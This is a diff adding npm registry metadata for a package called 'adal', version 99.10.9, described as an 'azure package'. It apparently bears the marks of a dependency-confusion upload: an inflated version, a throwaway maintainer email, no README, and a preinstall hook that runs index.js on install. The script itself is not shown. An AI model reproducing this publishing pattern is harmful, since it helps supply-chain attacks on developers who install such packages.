@@ -1,0 +1,62 @@
+{
+    "_id": "adal",
+    "name": "adal",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "adal",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "adal@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-49yX7EYYGP6AoOD7MqnnB/mz4MsEXrS0l5Rja83xmQ00iu2r12u6p6cWG23dw9bzpIMPdvXglJjiErC+w8jIgA==",
+                "shasum": "0fc52610286ab315003f8ec68972375dddb17631",
+                "tarball": "https://registry.npmjs.org/adal/-/adal-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5056,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOlb0ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp0ig//RTIxK0VyMw7g/WhN7w8Qxl9/UUbgHXuGFcPocgAEzMvK0MGG\r\nmDJYuI+N9tTzQtvM60seyeJhAaTGIxIQIdR2kvlUuP491vTTMZYDfC0B7mYW\r\nlKZ6os4Ckuzq73kzKkFCtHGCQZiSZeV1I3PLDPXhT6TkMxxhVXEz5pdkqmjI\r\n8bpjWP4SWtpenYlWfvelZR/8o3MpeUtks5csYsGArzUbQFhyBX2cxP1D+Iyr\r\nWd26qK4QirrjyCZdiWZbq5zcWI/VGZiAKOtYQ2xASKxN0VfwdxDHgLItx81S\r\n0Hw7zy2jafKULJ3+8JDW82hO09Vq7JjOPrR/Q2Xv4IbdlLmXPyiFDAax8fYK\r\nAC5yJdeivJxnShxUlH5Vo8NoNP4n3mHX4+mMKWzsJs527KIHXQ2Ry+BP5vVa\r\nn6p1HF9Dy9COhOlR0tyMD1z6rGBwsco7u8d840SxXibg9UmcIDrY+b3IDTcG\r\nswwux2IW1mb3Ng6wzwGGQiWpdLPUn/OjMCGm48VSb9ikn1LaK/KTg9TeGp4Z\r\nusMlOrN1Q5W+GsCXbUKUzUu6l6Wj7X+/0HfqX1/afJascyohH7CzjEEcwAdN\r\naKLmxtYYx1+r7zfOkBF8Z19pxq87/8rn46su7eu10DE39Z757QSUvqyz3Hiz\r\nx86aoyUbG9XPkgoNosJz+J6D8ASu2mMWR+A=\r\n=evvF\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "5o2bj1jv",
+                "email": "5o2bj1jv@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "5o2bj1jv",
+                    "email": "5o2bj1jv@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/adal_99.10.9_1647990516507_0.7368234264838232"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-22T23:08:36.507Z",
+        "99.10.9": "2022-03-22T23:08:36.649Z",
+        "modified": "2022-03-22T23:08:36.754Z"
+    },
+    "maintainers": [
+        {
+            "name": "5o2bj1jv",
+            "email": "5o2bj1jv@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
